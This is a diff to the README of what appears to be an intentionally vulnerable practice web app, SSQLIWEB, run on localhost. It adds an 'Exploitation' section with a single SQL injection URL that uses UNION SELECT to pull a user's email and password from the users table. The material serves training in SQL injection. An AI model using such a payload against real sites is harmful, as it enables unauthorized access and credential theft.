@@ -14,3 +14,9 @@ sudo ./installer.sh
 # Execution
 
 Once, it has been installed you can access to the vulnerable application at http://localhost/SSQLIWEB
+
+# Exploitation
+
+```bash
+http://localhost/SSQLIWEB/index.php?id=-1 UNION (SELECT id, email, password from users where id=1)
+```
